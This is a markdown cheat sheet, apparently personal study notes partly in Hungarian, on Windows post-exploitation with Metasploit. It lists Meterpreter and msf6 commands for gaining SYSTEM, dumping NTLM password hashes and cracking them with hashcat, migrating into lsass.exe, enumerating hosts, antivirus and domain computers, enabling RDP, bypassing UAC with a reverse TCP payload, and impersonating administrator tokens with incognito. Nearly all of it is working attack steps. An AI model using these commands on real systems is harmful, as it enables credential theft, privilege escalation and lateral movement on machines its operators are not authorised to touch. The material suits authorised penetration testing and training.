# windows post exploitation
## basic meterpreter things
* meterpreter> getsystem (elevate SYSTEM privileges from Administrator priv)
* meterpreter> hashdump
* meterpreter> show_mount
* meterpreter> ps
* meterpreter> migrate 2212
* meterpreter> migrate -N lsass.exe
## list saves files with enumeration information
* msf6> loot (list all file that is saved with enumeration information)
## msf post exploitation modules
* msf6> use post/multi/manage/shell_to_meterpreter
* msf6> use post/multi/manage/archmigrate
* msf6> use post/multi/manage/migrate (create new process and migrate to it)
* msf6> use post/windows/gather/win_privs
* msf6> use post/windows/gather/enum_logged_on_users
* msf6> use post/windows/gather/checkvm (check if the victim machine is a virtual machine or not)
* msf6> use post/windows/gather/enum_applications (applications and versions)
* msf6> loot (list all file that is saved with enumeration information)
* msf6> use post/windows/gather/enum_av_excluded (installed antivirus)
* msf6> use post/windows/gather/enum_computers (list other computers on the same domain of victim machine)
* msf6> use post/windows/gather/enum_patches
  * maybe need to migrate to another process to run successfully
  * or run native systeminfo from native shell instead of meterpreter
* msf6> use post/windows/gather/enum_shares
* msf6> use post/windows/manage/enable_rdp (build rdp session)
## bypassing UAC
* initial command
  * sysinfo, getuid, getsystem (probably will fail, if not - no UAC bypass needed at all), getprivs
  * shell > net users
  * shell > net localgroup administrators (our user should be in administrators group)
* msf6> use exploit/windows/local/bypassuac_injection
  * (lots of other bypassuac modules are exists!!!)
  * msf6 exploit(windows/local/bypassuac_injection)> set payload windows/x64/meterpreter/reverse_tcp
    * if OS is x86 - we need x86, if OS is x64 - we need x64
  * lehet hogy a targetet is at kell allitani x64 vagy x86-ra
    * msf6 exploit(windows/local/bypassuac_injection)> show targets
    * msf6 exploit(windows/local/bypassuac_injection)> set target 1 (or set target 2)
  * meterpreter> getsystem (most mar sikerulni fog)
  * meterpreter> hashdump (a masodik hash az ntlm hash - azt kell megtorni) (hashcat -m 1000)
## token impersonation with incognito
### info
* windows access token types
  * impersonate-level token: system services, domain logons  (works just on local system)
  * delegate-level token: simple physical login, rdp ((works globally at any system)
* privileges that can be used to do an impersonation attack
  * SeAssignPrimaryToken (allows a user to impersonate tokens)
  * SeCreateToken (allows a user to create arbitrary token with admin privs)
  * SeImpersonatePrivilege (allows a user to create a process - tipically with admin privs - under the security context of another user)
* if we exploit a service - often we have an "NT AUTHORITY\LOCAL SERVICE" access
### msf incognito modul
* meterpreter> load incognito
* meterpreter> list_tokens -u (list the tokens available)
* meterpreter> impersonate_token "LOCAL_NETWORK1\Administrator"
* meterpreter> migrate XXXX
  * it is needed in lots of situations because "NT AUTHORITY\LOCAL SERVICE" user has limited capabilities
## 
